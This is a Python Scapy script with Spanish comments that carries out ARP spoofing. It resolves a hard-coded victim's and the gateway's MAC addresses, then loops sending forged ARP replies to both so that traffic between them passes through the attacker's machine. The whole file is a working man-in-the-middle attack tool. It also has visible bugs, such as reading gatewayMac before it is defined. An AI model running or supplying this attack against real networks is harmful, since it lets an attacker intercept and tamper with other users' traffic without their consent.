from scapy.all import *  

#Interfaz por defecto
inface = conf.iface
intento = 0 # en un futuro se debe pedir al usuario la cantidad de intentos
#Resuelvo la IP y MAC de mi interfaz por defecto
attackerIp = get_if_addr(inface)
attackerMac = get_if_hwaddr(inface) 
victimIp = "192.168.0.5"
victimMac = None

gatewayIp= conf.route.route("0.0.0.0")[2]

while victimMac is None and gatewayMac is None:
    gatewayMac = scapy.all.getmacbyip(gatewayIp)
    victimMac = scapy.all.getmacbyip(victimIp)
    intento +=1
    if intento > 5:
        print("Resolución de MAC imposible tras:",intento,"intentos")
        exit() 

#print("Default interface is:",iface,"It's IP is:",ip)
# Creacion del paquete ARP envenenado
# ARP
#  psrc -> dirección IP de origen (Simulo ser el gateway respondiendo con ARP diciendo "soy el router esta es mi MAC (envío la MAC de mi interfaz)")
# op -> opcode: 1 para un ARP request, 2 para un ARP reply. Estamos simulando una respuesta del gateway entonces el opcode debe ser 2.
# pdst -> dirección IP de destino (A quien va dirigido el ataque)
packetToVictim = scapy.all.Ether(dst=victimMac) / scapy.all.ARP(op=2,psrc=gatewayIp,pdst=victimIp,hwsrc=attackerMac,hwdst=victimMac) 

packetToGateway = scapy.all.Ether(dst=gatewayMac) / scapy.all.ARP(op=2,psrc=victimIp,pdst=gatewayIp,hwsrc=attackerMac,hwdst=gatewayMac) 


try:
    while True:
        sendp(packetToVictim, iface=inface, verbose = False)
        sendp(packetToGateway, iface=inface, verbose = False)
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Ataque detenido por el usuario")